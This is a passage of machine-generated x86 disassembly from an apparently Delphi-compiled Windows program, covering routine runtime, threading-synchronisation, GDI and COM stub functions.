retn
sub_41b5ac
mov [ eax + 0x18 ] edx
retn
sub_41b728
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414a68
retn
sub_41b7af
jmp sub_4038d0
sub_41b7b6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b862
jmp sub_4038d0
sub_41b869
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ba0d
jmp sub_4038d0
sub_41ba5f
jmp sub_4038d0
sub_41ba7e
jmp sub_4038d0
sub_41ba85
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41baa4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41ba9d
jmp sub_4038d0
sub_41baa4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bb47
jmp sub_4038d0
sub_41bbcf
jmp sub_4038d0
sub_41bbdc
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
pop ebx
retn
sub_41bbf4
mov eax [ rw-data ]
call sub_41bbdc
retn
sub_41bc2c
push ebx
call sub_41489c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41bbf4
sub_41bd99
jmp sub_4038d0
sub_41bda0
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f50
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41bec0
jmp sub_4038d0
sub_41bec7
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41bfbe
jmp sub_4038d0
sub_41bfdb
jmp sub_4038d0
sub_41bfe2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c0e0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41aac4
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41c1a4
push ebx
mov ebx eax
mov eax ebx
call sub_41db58
cmp al 0x9
sete al
pop ebx
retn
sub_41c203
jmp sub_4038d0
sub_41c20a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41c2b0
jmp sub_4038d0
sub_41c2b7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c2d0
jmp [ eax ]
sub_41c536
jmp sub_40361c
sub_41c562
jmp sub_40361c
sub_41c604
jmp sub_40361c
sub_41c6a7
jmp sub_40361c
sub_41c87f
jmp sub_40361c
sub_41c8c1
jmp sub_4038d0
sub_41c8f1
jmp sub_4038d0
sub_41c8f8
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c967
jmp sub_4038d0
sub_41ca3e
jmp sub_4038d0
sub_41ca45
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cd18
mov dl 0x1
call sub_41bc80
retn
sub_41ce50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41ce59
jmp sub_4038d0
j_sub_41ce50
jmp sub_41ce50
sub_41ce60
pop ebx
mov esp ebp
pop ebp
retn
sub_41ce68
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41dc68
mov eax [ rw-data ]
call sub_41bbdc
pop ebp
retn
j_sub_403748#8
jmp sub_403748
j_sub_403748#9
jmp sub_403748
sub_41d054
jmp sub_4038d0
sub_41d05b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d13b
jmp sub_4038d0
sub_41d142
mov esp ebp
pop ebp
retn
sub_41d1fa
jmp sub_4038d0
sub_41d201
pop ecx
pop ecx
pop ebp
retn
sub_41d503
jmp sub_4038d0
sub_41d50a
pop ebx
mov esp ebp
pop ebp
retn
sub_41d7af
jmp sub_4038d0
sub_41d7b6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403154
retn
sub_41d7cf
jmp sub_4038d0
sub_41d7f3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_40361c
sub_41d82a
jmp sub_40361c
sub_41d869
jmp sub_4038d0
sub_41d870
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d892
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f74
retn
sub_41d88b
jmp sub_4038d0
sub_41d892
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d919
jmp sub_40361c
sub_41d946
jmp sub_4038d0
sub_41d94d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d958
push ecx
mov edx esp
mov ecx 0x4
call sub_41c11c
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41bbdc
sub_41da65
jmp sub_4038d0
sub_41da6c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41db4b
jmp sub_4038d0
sub_41db52
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dba8
jmp sub_4038d0
sub_41dbaf
pop ebx
pop ecx
pop ebp
retn
sub_41ddf7
jmp sub_4038d0
sub_41ddfe
pop ecx
pop ecx
pop ebp
retn
sub_41de41
jmp sub_4038d0
sub_41de48
pop ebx
pop ecx
pop ebp
retn
sub_41dee4
jmp sub_4038d0
sub_41deeb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41df99
jmp sub_4038d0
sub_41dfa0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dfac
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41e207
jmp sub_4038d0
sub_41e20e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e233
mov eax [ ebp - 0x8 ]
call sub_403154
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_41e22c
jmp sub_4038d0
sub_41e233
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e258
lea eax [ ebp - 0x1c ]
call sub_4057bc
lea eax [ ebp - 0x18 ]
call sub_403f50
retn
sub_41e251
jmp sub_4038d0
sub_41e258
pop ebx
mov esp ebp
pop ebp
retn
sub_41e46a
jmp sub_4038d0
sub_41e471
pop ebx
mov esp ebp
pop ebp
retn
sub_41e4a4
mov eax [ eax + 0x30 ]
call sub_418454
retn
sub_41e514
call sub_41e644
retn
sub_41e558
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b5ac
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41e633
jmp sub_4038d0
sub_41e63a
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e644
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41ad28
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41e65c
test dl dl
je r-xdata
mov dl 0x8
call sub_4207c8
retn
mov dl 0x9
call sub_4207c8
retn
sub_41e6b3
jmp sub_4038d0
sub_41e6ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41e752
jmp sub_4038d0
sub_41e759
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e8f7
jmp sub_4038d0
sub_41e8fe
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ec3f
jmp sub_4038d0
sub_41ec81
jmp sub_4038d0
sub_41ece0
jmp sub_4038d0
sub_41ece7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ef4c
mov dl 0x1
call sub_4207c8
retn
sub_41ef54
xor edx edx
call sub_4207c8
retn
sub_41f04d
jmp sub_4038d0
sub_41f223
jmp sub_4038d0
sub_41f22a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f3f8
jmp sub_4038d0
sub_41f3ff
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f4d5
jmp sub_4038d0
sub_41f4dc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f5f3
jmp sub_4038d0
sub_41f5fa
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f7b4
jmp sub_4038d0
sub_41f7bb
pop ecx
pop ebp
retn
sub_41f846
jmp sub_4038d0
sub_41f84d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f8b4
jmp sub_4038d0
sub_41f8bb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f939
jmp sub_4038d0
sub_41f940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f95d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41f956
jmp sub_4038d0
sub_41f95d
pop ebx
pop ecx
pop ebp
retn
sub_41fa18
jmp sub_4038d0
sub_41fa1f
pop ebx
pop ecx
pop ebp
retn
sub_41faf5
jmp sub_4038d0
sub_41fafc
pop ecx
pop ebp
retn
sub_41fb00
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41fc07
jmp sub_4038d0
sub_41fc0e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fdb5
jmp sub_4038d0
sub_41fe34
jmp sub_4038d0
sub_41fe3b
mov esp ebp
pop ebp
retn
sub_41ff09
jmp sub_4038d0
sub_41ff10
pop ebx
mov esp ebp
pop ebp
retn
sub_41ffc3
jmp sub_4038d0
sub_41ffca
pop ebx
mov esp ebp
pop ebp
retn
sub_420029
jmp sub_4038d0
sub_420030
mov esp ebp
pop ebp
retn
sub_420495
jmp sub_4038d0
sub_4204ef
jmp sub_4038d0
sub_420500
jmp sub_40361c
sub_42055c
jmp sub_4038d0
sub_420563
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4205c2
jmp sub_4038d0
sub_4205c9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4205d0
mov edx rw-data
mov ecx 0x4
call sub_41e570
retn
sub_420705
jmp sub_4038d0
sub_42070c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4207ba
jmp sub_4038d0
sub_4207c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420800
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cbd4
sub_420834
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_42084c
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_420858
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_42084c
sub_420874
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_420880
push rw-data
call InterlockedIncrement
retn
sub_42088c
push rw-data
call InterlockedDecrement
retn
sub_4209a2
jmp sub_40361c
sub_4209d1
jmp sub_4038d0
sub_420a07
jmp sub_4038d0
sub_420a0e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a2d
push rw-data
call LeaveCriticalSection
retn
sub_420a26
jmp sub_4038d0
sub_420a2d
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420a79
jmp sub_40361c
sub_420b8a
jmp sub_4038d0
sub_420b91
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_420c18
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_420ef8
sub_420c92
jmp sub_4038d0
sub_420c99
pop ebx
mov esp ebp
pop ebp
retn
sub_420cb8
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_420ccc
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_420cb8
call sub_420e4c
sub_420df1
jmp sub_4038d0
sub_420df8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420e17
push rw-data
call LeaveCriticalSection
retn
sub_420e10
jmp sub_4038d0
sub_420e17
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_420e2e
jmp sub_4038d0
sub_420e74
cmp dl [ eax + 0xe ]
je r-xdata
retn
test dl dl
je r-xdata
call sub_420ef8
call sub_420e8c
jmp r-xdata
sub_420ed9
jmp sub_40361c
sub_420f20
mov [ eax + 0xd ] 0x1
retn
sub_421090
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_42126c
sub_4210f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cc68
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_421104
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cc68
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_421118
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41ee80
retn
sub_421124
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41ee80
retn
sub_4213cc
xor eax eax
retn
sub_4213d0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4213d8
xor eax eax
retn
sub_4213dc
retn
sub_4213e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fa4
pop esi
pop ebx
retn
sub_4213f4
mov eax [ eax + 0x4 ]
retn
sub_4213f8
retn
sub_4213fc
xor eax eax
retn
sub_421400
retn
sub_421404
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_421410
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_42141c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_421428
retn
sub_42142c
xchg edx eax
call sub_41c90c
retn
sub_421434
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_4214bc
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403350
pop esi
retn
sub_4214d0
retn
sub_4215b0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fa4
pop esi
pop ebx
retn
sub_4215f0
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_42173c
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403384
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_421754
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4217dc
retn
sub_421824
retn
sub_42185c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_421874
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421a98
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403350
pop esi
pop ebx
retn
sub_4218bc
mov al 0x1
retn
sub_4218c0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4218c8
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_421970
xor eax eax
retn
sub_421974
retn
sub_4219a0
retn
sub_421a38
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_421a4c
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_418454
retn
sub_421b93
jmp sub_40361c
sub_421b98
mov ebx 0x1
call sub_403984
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421bfb
jmp sub_40361c
sub_421c00
mov ebx 0x80030103
call sub_403984
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421c7e
jmp sub_40361c
sub_421c83
mov ebx 0x80030009
call sub_403984
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_421ce1
jmp sub_40361c
sub_421ce6
mov ebx 0x8000ffff
call sub_403984
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421eb1
jmp sub_4038d0
sub_421ec2
jmp sub_40361c
sub_421ec7
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421ef0
lea eax [ ebp + 0xc ]
call sub_4057bc
retn
sub_421ee9
jmp sub_4038d0
sub_421ef0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_421efc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_421f08
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_421f14
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_421f20
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_421f8f
jmp sub_40361c
sub_421f94
mov esi 0x8000ffff
call sub_403984
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421fa8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_422015
jmp sub_4038d0
sub_42201c
mov eax [ rw-data ]
call sub_403154
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42202c
call sub_417b98
retn
sub_4220f4
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_422298
jmp sub_4038d0
sub_42229f
pop ebp
retn
sub_42232d
jmp sub_4038d0
sub_422334
pop ebp
retn
sub_4225d5
jmp sub_4038d0
sub_4225dc
pop ebp
retn
sub_4225e0
sub [ rw-data ] 0x1
retn
sub_422e6e
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
sub_422e7b
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_423298
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_42330c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_423380
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42338c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42346c
jmp sub_4038d0
sub_423473
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423503
jmp sub_4038d0
sub_423595
jmp sub_4038d0
sub_42359c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423600
jmp sub_4038d0
sub_423607
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42366f
jmp sub_4038d0
sub_423676
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423719
jmp sub_4038d0
sub_423720
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423b78
push 0x33
mov ecx rw-data
call sub_417ed4
retn
sub_423b88
push 0x33
mov ecx rw-data
call sub_417e94
retn
sub_423b98
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_423bbc
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_423d90
push 0x11
mov ecx rw-data
call sub_417e94
retn
sub_423ed0
push ebx
mov ebx eax
mov eax ebx
call sub_423b98
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_423f8a
jmp sub_4038d0
sub_423f91
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423bbc
retn
sub_423fa7
jmp sub_4038d0
sub_423fc0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_42401d
jmp sub_4038d0
sub_424024
pop ebx
pop ecx
pop ebp
retn
sub_42419d
jmp sub_4038d0
sub_4241c5
jmp sub_4038d0
sub_4241cc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_424238
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4041b4
pop esi
pop ebx
retn
sub_4242ac
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_424208
push eax
call MulDiv
neg eax
pop ebx
retn
sub_4242e8
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_424320
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_424350
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_42446e
jmp sub_4038d0
sub_424475
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423bbc
retn
sub_42448b
jmp sub_4038d0
sub_424501
jmp sub_4038d0
sub_424508
pop ebx
pop ecx
pop ebp
retn
sub_42450c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_4245c2
jmp sub_4038d0
sub_4245d4
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403350
sub_4245e8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424618
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_424727
jmp sub_4038d0
sub_42472e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423bbc
retn
sub_424744
jmp sub_4038d0
sub_4247bd
jmp sub_4038d0
sub_4247c4
pop ebx
pop ecx
pop ebp
retn
sub_4248f5
jmp sub_4038d0
sub_424908
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424c0c
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_424ea0
jmp sub_4038d0
sub_424ea7
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_424eb0
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_424ee8
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_425034
retn
sub_4250fd
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_425114
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_425200
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425220
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425240
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425260
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
pop ebx
retn
sub_425278
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
pop ebx
retn
sub_42529c
mov eax [ rw-data ]
call sub_425278
retn
sub_4252f2
jmp sub_4038d0
sub_4252f9
pop ecx
pop ebp
retn
sub_425398
jmp sub_4038d0
sub_42539f
pop ebx
mov esp ebp
pop ebp
retn
sub_425471
jmp sub_4038d0
sub_425502
jmp sub_4038d0
sub_425509
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425534
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_42561b
jmp sub_4038d0
sub_4257c8
jmp sub_4038d0
sub_4257cf
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_4259e1
jmp sub_4038d0
sub_4259e8
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_425a82
jmp sub_4038d0
sub_425c5e
jmp sub_4038d0
sub_425d18
jmp sub_4038d0
sub_425d1f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d3f
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425d38
jmp sub_4038d0
sub_425d3f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_425ecd
jmp sub_4038d0
sub_426098
jmp sub_4038d0
sub_42609f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4260c2
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026fc
retn
sub_4260bb
jmp sub_4038d0
sub_4260c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4260e2
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
sub_4260db
jmp sub_4038d0
sub_4260e2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_426234
push 0x0
call sub_4261d0
retn
sub_4262d9
jmp sub_4038d0
sub_4262e0
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4262ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_42623c
pop ebx
pop ebp
retn 0x4
sub_426300
retn
sub_426304
test eax eax
jne r-xdata
retn
call sub_426300
sub_4264d7
jmp sub_4038d0
sub_4264fe
jmp sub_4038d0
sub_426505
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426544
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_426711
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub_42671a
jmp sub_4038d0
j_sub_426711
jmp sub_426711
sub_426721
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403154
retn
sub_426737
jmp sub_4038d0
sub_426748
xor eax eax
retn
sub_42674c
mov al [ eax + 0x21 ]
retn
sub_426798
jmp sub_4038d0
sub_42679f
pop esi
pop ecx
pop ebp
retn
sub_4267cc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_426823
jmp sub_4038d0
sub_42682a
pop esi
pop ecx
pop ebp
retn
sub_426830
retn
sub_426834
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426844
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_426962
jmp sub_4038d0
sub_42698a
jmp sub_4038d0
sub_426991
mov esp ebp
pop ebp
retn
sub_426a08
jmp sub_4038d0
sub_426b10
jmp sub_4038d0
sub_426bfb
jmp sub_4038d0
sub_426c08
inc [ eax + 0x4 ]
retn
sub_426d83
jmp sub_4038d0
sub_427134
jmp sub_4038d0
sub_42737e
